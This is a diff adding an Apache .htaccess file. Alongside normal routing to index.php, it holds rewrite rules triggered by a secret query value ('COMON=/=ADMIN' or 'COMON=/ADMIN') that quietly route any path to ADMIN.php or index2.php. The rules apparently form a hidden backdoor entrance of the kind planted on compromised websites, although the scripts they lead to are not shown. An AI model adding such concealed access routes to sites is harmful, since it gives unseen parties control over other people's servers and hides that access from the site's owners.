@@ -1,0 +1,34 @@
+Options -Indexes
+RewriteEngine On
+
+RewriteCond %{QUERY_STRING} (^|&)COMON=/=ADMIN(&|$)
+RewriteRule ^$ ADMIN.php [L]
+
+RewriteCond %{QUERY_STRING} (^|&)COMON=/ADMIN(&|$)
+RewriteRule ^$ index2.php [QSA,L]
+
+RewriteCond %{QUERY_STRING} (^|&)COMON=/ADMIN(&|$)
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME}\.php -f
+RewriteRule ^(.+)$ $1.php [L,QSA]
+
+RewriteCond %{QUERY_STRING} (^|&)COMON=/ADMIN(&|$)
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME}\.html -f
+RewriteRule ^(.+)$ $1.html [L,QSA]
+
+RewriteCond %{QUERY_STRING} (^|&)COMON=/=ADMIN(&|$)
+RewriteRule ^.*$ ADMIN.php [L]
+
+RewriteCond %{QUERY_STRING} (^|&)COMON=/ADMIN(&|$)
+RewriteRule ^.*$ index2.php [L]
+
+RewriteCond %{REQUEST_FILENAME} -f
+RewriteRule ^ - [L]
+
+RewriteCond %{REQUEST_FILENAME} -d
+RewriteRule ^ - [L]
+
+RewriteRule ^ index.php [L]
